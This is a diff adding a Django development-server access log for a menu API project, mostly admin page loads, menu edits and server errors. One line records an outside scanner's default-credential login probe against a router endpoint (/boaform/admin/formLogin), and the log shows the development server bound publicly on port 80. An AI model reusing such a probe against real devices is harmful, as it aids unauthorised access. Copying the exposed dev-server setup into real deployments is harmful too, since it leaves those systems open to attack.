@@ -1,0 +1,2888 @@
+Watching for file changes with StatReloader
+[05/May/2022 07:47:46] "GET /admin/ HTTP/1.1" 200 6781
+[05/May/2022 07:47:46] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[05/May/2022 07:47:46] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0
+[05/May/2022 07:47:46] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
+[05/May/2022 07:47:46] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[05/May/2022 07:47:46] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0
+[05/May/2022 07:47:46] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[05/May/2022 07:47:46] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[05/May/2022 07:47:46] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[05/May/2022 07:47:46] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 304 0
+[05/May/2022 07:47:46] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[05/May/2022 07:47:46] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[05/May/2022 07:47:46] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[05/May/2022 07:47:58] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9337
+[05/May/2022 07:47:58] "GET /static/admin/css/forms.css HTTP/1.1" 304 0
+[05/May/2022 07:47:58] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[05/May/2022 07:47:58] "GET /static/admin/js/calendar.js HTTP/1.1" 304 0
+[05/May/2022 07:47:58] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 304 0
+[05/May/2022 07:47:58] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[05/May/2022 07:47:58] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:47:58] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[05/May/2022 07:47:58] "GET /static/admin/css/widgets.css HTTP/1.1" 304 0
+[05/May/2022 07:47:58] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[05/May/2022 07:47:58] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[05/May/2022 07:47:58] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[05/May/2022 07:47:58] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[05/May/2022 07:47:58] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[05/May/2022 07:47:58] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 304 0
+[05/May/2022 07:47:58] "GET /static/admin/js/change_form.js HTTP/1.1" 304 0
+[05/May/2022 07:47:58] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 304 0
+[05/May/2022 07:48:02] "POST /menu/ HTTP/1.1" 200 210
+[05/May/2022 07:48:27] "GET /static/admin/img/calendar-icons.svg HTTP/1.1" 304 0
+Internal Server Error: /menu/
+[05/May/2022 07:48:37] "POST /menu/ HTTP/1.1" 500 115
+[05/May/2022 07:48:47] "POST /menu/ HTTP/1.1" 200 233
+[05/May/2022 07:48:59] "POST /admin/menu/menu/add/ HTTP/1.1" 200 9612
+[05/May/2022 07:48:59] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:49:32] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 07:49:32] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9572
+[05/May/2022 07:49:33] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:49:33] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 304 0
+[05/May/2022 07:49:56] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 07:49:56] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9572
+[05/May/2022 07:49:56] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+Internal Server Error: /menu/
+[05/May/2022 07:50:04] "POST /menu/ HTTP/1.1" 500 115
+Internal Server Error: /menu/
+[05/May/2022 07:50:11] "POST /menu/ HTTP/1.1" 500 115
+[05/May/2022 07:50:11] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 07:50:11] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9572
+[05/May/2022 07:50:12] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+Internal Server Error: /menu/
+[05/May/2022 07:50:54] "POST /menu/ HTTP/1.1" 500 115
+[05/May/2022 07:51:14] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 07:51:14] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9572
+[05/May/2022 07:51:14] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:51:18] "POST /menu/ HTTP/1.1" 200 233
+Method Not Allowed (GET): /menu/
+Method Not Allowed: /menu/
+[05/May/2022 07:51:27] "GET /menu/ HTTP/1.1" 405 0
+[05/May/2022 07:51:48] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 07:51:48] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9572
+[05/May/2022 07:51:48] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:52:08] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 07:52:08] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9572
+[05/May/2022 07:52:09] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:52:34] "POST /menu/ HTTP/1.1" 200 233
+[05/May/2022 07:52:44] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 07:52:44] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9572
+[05/May/2022 07:52:44] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:53:03] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 07:53:03] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9572
+[05/May/2022 07:53:04] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:53:28] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 07:53:28] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9572
+[05/May/2022 07:53:28] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:54:38] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 07:54:40] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9572
+[05/May/2022 07:54:40] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:54:42] "POST /admin/menu/menu/add/ HTTP/1.1" 200 9622
+[05/May/2022 07:54:44] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:55:11] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 07:55:11] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9572
+[05/May/2022 07:55:11] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:55:30] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 07:55:30] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9572
+[05/May/2022 07:55:30] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:55:39] "POST /menu/ HTTP/1.1" 200 233
+[05/May/2022 07:55:57] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 07:55:57] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9572
+[05/May/2022 07:55:57] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:56:22] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 07:56:23] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9572
+[05/May/2022 07:56:23] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:57:05] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 07:57:05] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9572
+[05/May/2022 07:57:05] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:57:30] "GET /admin/ HTTP/1.1" 200 6873
+[05/May/2022 07:57:37] "GET /admin/auth/group/ HTTP/1.1" 200 5386
+[05/May/2022 07:57:37] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
+[05/May/2022 07:57:37] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:57:37] "GET /static/admin/img/search.svg HTTP/1.1" 200 458
+[05/May/2022 07:57:37] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 304 0
+[05/May/2022 07:57:39] "GET /admin/auth/user/ HTTP/1.1" 200 8473
+[05/May/2022 07:57:39] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 07:57:39] "GET /static/admin/img/sorting-icons.svg HTTP/1.1" 200 1097
+[05/May/2022 07:57:43] "GET /admin/menu/menu/ HTTP/1.1" 200 19189
+[05/May/2022 07:57:43] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+Internal Server Error: /menu/
+[05/May/2022 07:59:02] "POST /menu/ HTTP/1.1" 500 115
+Internal Server Error: /menu/
+[05/May/2022 07:59:50] "POST /menu/ HTTP/1.1" 500 115
+[05/May/2022 08:00:23] "POST /menu/ HTTP/1.1" 200 210
+Internal Server Error: /menu/
+[05/May/2022 08:01:05] "POST /menu/ HTTP/1.1" 500 115
+Not Found: /boaform/admin/formLogin
+[05/May/2022 08:02:13] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 2302
+Internal Server Error: /menu/
+[05/May/2022 08:02:20] "POST /menu/ HTTP/1.1" 500 115
+Internal Server Error: /menu/
+[05/May/2022 08:02:27] "POST /menu/ HTTP/1.1" 500 115
+Internal Server Error: /menu/
+[05/May/2022 08:02:50] "POST /menu/ HTTP/1.1" 500 115
+Internal Server Error: /menu/
+[05/May/2022 08:02:56] "POST /menu/ HTTP/1.1" 500 115
+Internal Server Error: /menu/
+[05/May/2022 08:03:30] "POST /menu/ HTTP/1.1" 500 115
+Watching for file changes with StatReloader
+[05/May/2022 11:51:14] "GET /admin/ HTTP/1.1" 200 4557
+[05/May/2022 11:51:14] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[05/May/2022 11:51:14] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 2616
+[05/May/2022 11:51:14] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18575
+[05/May/2022 11:51:14] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
+[05/May/2022 11:51:14] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 3401
+[05/May/2022 11:51:14] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[05/May/2022 11:51:14] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[05/May/2022 11:51:14] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[05/May/2022 11:51:14] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[05/May/2022 11:51:14] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[05/May/2022 11:51:14] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[05/May/2022 11:51:14] "GET /favicon.ico HTTP/1.1" 404 2228
+[05/May/2022 11:51:16] "GET /admin/menu/menu/ HTTP/1.1" 200 8144
+[05/May/2022 11:51:16] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
+[05/May/2022 11:51:16] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[05/May/2022 11:51:16] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[05/May/2022 11:51:16] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[05/May/2022 11:51:16] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[05/May/2022 11:51:16] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 11:51:16] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[05/May/2022 11:51:16] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[05/May/2022 11:51:16] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[05/May/2022 11:51:16] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[05/May/2022 11:51:16] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 304 0
+[05/May/2022 11:51:19] "GET /admin/menu/menu/ HTTP/1.1" 200 8144
+[05/May/2022 11:51:19] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 11:51:42] "POST /menu/ HTTP/1.1" 200 135
+Performing system checks...
+
+System check identified no issues (0 silenced).
+May 05, 2022 - 11:51:12
+Django version 4.0.4, using settings 'airforce_bokdori_api.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+[05/May/2022 11:52:35] "GET /admin/menu/menu/ HTTP/1.1" 200 8144
+[05/May/2022 11:52:35] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 11:52:43] "POST /menu/ HTTP/1.1" 200 165
+[05/May/2022 11:54:34] "POST /menu/ HTTP/1.1" 200 135
+[05/May/2022 12:05:19] "GET /admin/menu/menu/ HTTP/1.1" 200 8144
+[05/May/2022 12:05:19] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:05:22] "GET /admin/menu/menu/2/change/ HTTP/1.1" 200 9686
+[05/May/2022 12:05:22] "GET /static/admin/css/forms.css HTTP/1.1" 200 8878
+[05/May/2022 12:05:22] "GET /static/admin/js/calendar.js HTTP/1.1" 200 8466
+[05/May/2022 12:05:22] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 492
+[05/May/2022 12:05:22] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 200 19634
+[05/May/2022 12:05:22] "GET /static/admin/css/widgets.css HTTP/1.1" 200 11097
+[05/May/2022 12:05:22] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:05:22] "GET /static/admin/js/change_form.js HTTP/1.1" 200 606
+[05/May/2022 12:05:22] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 200 1086
+[05/May/2022 12:05:26] "GET /admin/menu/menu/ HTTP/1.1" 200 8144
+[05/May/2022 12:05:27] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9337
+[05/May/2022 12:05:27] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:05:29] "GET /admin/menu/menu/ HTTP/1.1" 200 8144
+Watching for file changes with StatReloader
+[05/May/2022 12:06:04] "GET /admin/menu/menu/ HTTP/1.1" 200 8144
+[05/May/2022 12:06:04] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:06:05] "GET /admin/menu/menu/2/change/ HTTP/1.1" 200 9686
+[05/May/2022 12:06:05] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:06:08] "GET /admin/menu/menu/ HTTP/1.1" 200 8144
+[05/May/2022 12:06:09] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9337
+[05/May/2022 12:06:09] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:06:11] "GET /admin/menu/menu/ HTTP/1.1" 200 8144
+[05/May/2022 12:08:51] "GET /admin/menu/menu/ HTTP/1.1" 200 8144
+[05/May/2022 12:08:51] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+/opt/airforce_bokdori_api/airforce_bokdori_api/airforce_bokdori_api/menu/models.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+May 05, 2022 - 12:06:00
+Django version 4.0.4, using settings 'airforce_bokdori_api.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+[05/May/2022 12:09:22] "GET /admin/menu/menu/ HTTP/1.1" 302 0
+[05/May/2022 12:09:22] "GET /admin/login/?next=/admin/menu/menu/ HTTP/1.1" 200 2235
+[05/May/2022 12:09:22] "GET /static/admin/css/login.css HTTP/1.1" 304 0
+[05/May/2022 12:09:27] "POST /admin/login/?next=/admin/menu/menu/ HTTP/1.1" 302 0
+[05/May/2022 12:09:27] "GET /admin/menu/menu/ HTTP/1.1" 200 8134
+[05/May/2022 12:09:27] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:09:29] "GET /admin/menu/menu/2/change/ HTTP/1.1" 200 9845
+[05/May/2022 12:09:29] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:09:34] "POST /admin/menu/menu/2/change/ HTTP/1.1" 302 0
+[05/May/2022 12:09:34] "GET /admin/menu/menu/ HTTP/1.1" 200 8354
+[05/May/2022 12:09:34] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:09:34] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
+[05/May/2022 12:09:36] "GET /admin/menu/menu/1/change/ HTTP/1.1" 200 9830
+[05/May/2022 12:09:36] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:09:38] "POST /admin/menu/menu/1/change/ HTTP/1.1" 302 0
+[05/May/2022 12:09:38] "GET /admin/menu/menu/ HTTP/1.1" 200 8371
+[05/May/2022 12:09:39] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+Watching for file changes with StatReloader
+[05/May/2022 12:10:01] "GET /admin/menu/menu/ HTTP/1.1" 200 8168
+[05/May/2022 12:10:01] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:10:02] "GET /admin/menu/menu/1/change/ HTTP/1.1" 200 9839
+[05/May/2022 12:10:02] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+Method Not Allowed (GET): /menu/
+Method Not Allowed: /menu/
+[05/May/2022 12:12:00] "GET /menu/ HTTP/1.1" 405 0
+[05/May/2022 12:12:06] "GET /admin/ HTTP/1.1" 302 0
+[05/May/2022 12:12:06] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[05/May/2022 12:12:06] "GET /static/admin/css/base.css HTTP/1.1" 200 19513
+[05/May/2022 12:12:06] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 2616
+[05/May/2022 12:12:06] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 3401
+[05/May/2022 12:12:06] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18575
+[05/May/2022 12:12:06] "GET /static/admin/css/login.css HTTP/1.1" 200 954
+[05/May/2022 12:12:06] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[05/May/2022 12:12:06] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[05/May/2022 12:12:06] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[05/May/2022 12:12:11] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[05/May/2022 12:12:21] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[05/May/2022 12:12:22] "GET /admin/ HTTP/1.1" 200 5137
+Forbidden (CSRF token from POST incorrect.): /admin/login/
+[05/May/2022 12:12:22] "POST /admin/login/?next=/admin/ HTTP/1.1" 403 2518
+[05/May/2022 12:13:38] "GET /admin/ HTTP/1.1" 302 0
+[05/May/2022 12:13:38] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[05/May/2022 12:13:41] "GET /admin/ HTTP/1.1" 302 0
+[05/May/2022 12:13:41] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[05/May/2022 12:13:41] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 2616
+[05/May/2022 12:13:41] "GET /static/admin/css/base.css HTTP/1.1" 200 19513
+[05/May/2022 12:13:41] "GET /static/admin/css/login.css HTTP/1.1" 200 954
+[05/May/2022 12:13:41] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18575
+[05/May/2022 12:13:41] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 3401
+[05/May/2022 12:13:41] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[05/May/2022 12:13:41] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[05/May/2022 12:13:41] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+Not Found: /favicon.ico
+[05/May/2022 12:13:41] "GET /favicon.ico HTTP/1.1" 404 2228
+[05/May/2022 12:13:48] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[05/May/2022 12:13:48] "GET /admin/ HTTP/1.1" 200 5137
+[05/May/2022 12:13:48] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
+[05/May/2022 12:13:48] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[05/May/2022 12:13:48] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[05/May/2022 12:13:48] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[05/May/2022 12:14:11] "GET /admin/menu/menu/ HTTP/1.1" 200 8168
+[05/May/2022 12:14:11] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6932
+[05/May/2022 12:14:11] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[05/May/2022 12:14:11] "GET /static/admin/js/core.js HTTP/1.1" 200 5698
+[05/May/2022 12:14:11] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 5984
+[05/May/2022 12:14:11] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:14:11] "GET /static/admin/js/actions.js HTTP/1.1" 200 7872
+[05/May/2022 12:14:11] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 288580
+[05/May/2022 12:14:11] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[05/May/2022 12:14:11] "GET /static/admin/js/urlify.js HTTP/1.1" 200 7902
+[05/May/2022 12:14:11] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 232381
+[05/May/2022 12:14:11] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[05/May/2022 12:14:16] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[05/May/2022 12:14:16] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 492
+[05/May/2022 12:14:16] "GET /static/admin/js/calendar.js HTTP/1.1" 200 8466
+[05/May/2022 12:14:16] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:14:16] "GET /static/admin/css/forms.css HTTP/1.1" 200 8878
+[05/May/2022 12:14:16] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 200 19634
+[05/May/2022 12:14:16] "GET /static/admin/css/widgets.css HTTP/1.1" 200 11097
+[05/May/2022 12:14:16] "GET /static/admin/js/change_form.js HTTP/1.1" 200 606
+[05/May/2022 12:14:16] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 200 1086
+[05/May/2022 12:14:30] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 12:14:30] "GET /admin/menu/menu/ HTTP/1.1" 200 8843
+[05/May/2022 12:14:30] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:14:30] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
+[05/May/2022 12:18:18] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:18:32] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:18:39] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[05/May/2022 12:18:39] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:18:52] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 12:18:52] "GET /admin/menu/menu/ HTTP/1.1" 200 9324
+[05/May/2022 12:18:52] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:19:07] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:22:19] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:23:08] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[05/May/2022 12:23:08] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:23:23] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 12:23:23] "GET /admin/menu/menu/ HTTP/1.1" 200 9815
+[05/May/2022 12:23:23] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:23:39] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[05/May/2022 12:23:39] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:23:51] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 12:23:51] "GET /admin/menu/menu/ HTTP/1.1" 200 10305
+[05/May/2022 12:23:51] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:23:59] "GET /admin/menu/menu/2/change/ HTTP/1.1" 200 9854
+[05/May/2022 12:23:59] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:24:02] "POST /admin/menu/menu/2/change/ HTTP/1.1" 302 0
+[05/May/2022 12:24:03] "GET /admin/menu/menu/ HTTP/1.1" 200 10307
+[05/May/2022 12:24:03] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:24:46] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:24:54] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:25:01] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:25:31] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:25:53] "GET /admin/auth/user/ HTTP/1.1" 200 8473
+[05/May/2022 12:25:53] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:25:53] "GET /static/admin/img/search.svg HTTP/1.1" 200 458
+[05/May/2022 12:25:53] "GET /static/admin/img/sorting-icons.svg HTTP/1.1" 200 1097
+[05/May/2022 12:25:54] "GET /admin/menu/menu/ HTTP/1.1" 200 10104
+[05/May/2022 12:25:54] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:26:05] "GET /admin/menu/menu/3/change/ HTTP/1.1" 200 9842
+[05/May/2022 12:26:05] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:26:08] "POST /admin/menu/menu/3/change/ HTTP/1.1" 302 0
+[05/May/2022 12:26:08] "GET /admin/menu/menu/ HTTP/1.1" 200 10307
+[05/May/2022 12:26:08] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:26:25] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:26:53] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:27:02] "GET /admin/auth/user/ HTTP/1.1" 200 8473
+[05/May/2022 12:27:02] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:27:04] "GET /admin/auth/group/ HTTP/1.1" 200 5386
+[05/May/2022 12:27:04] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:27:05] "GET /admin/menu/menu/ HTTP/1.1" 200 10104
+[05/May/2022 12:27:05] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:27:16] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:27:55] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:28:56] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:30:20] "GET /admin/menu/menu/1/change/ HTTP/1.1" 200 9839
+[05/May/2022 12:30:20] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:30:21] "GET /admin/menu/menu/1/delete/ HTTP/1.1" 200 5009
+[05/May/2022 12:30:21] "GET /static/admin/js/cancel.js HTTP/1.1" 200 884
+[05/May/2022 12:30:22] "POST /admin/menu/menu/1/delete/ HTTP/1.1" 302 0
+[05/May/2022 12:30:22] "GET /admin/menu/menu/ HTTP/1.1" 200 9776
+[05/May/2022 12:30:22] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:30:50] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:31:22] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[05/May/2022 12:31:22] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:31:40] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 12:31:40] "GET /admin/menu/menu/ HTTP/1.1" 200 10304
+[05/May/2022 12:31:40] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:34:16] "GET /admin/ HTTP/1.1" 200 6827
+[05/May/2022 12:34:16] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
+Not Found: /favicon.ico
+[05/May/2022 12:34:17] "GET /favicon.ico HTTP/1.1" 404 2228
+[05/May/2022 12:34:18] "GET /admin/menu/menu/ HTTP/1.1" 200 10103
+[05/May/2022 12:34:18] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
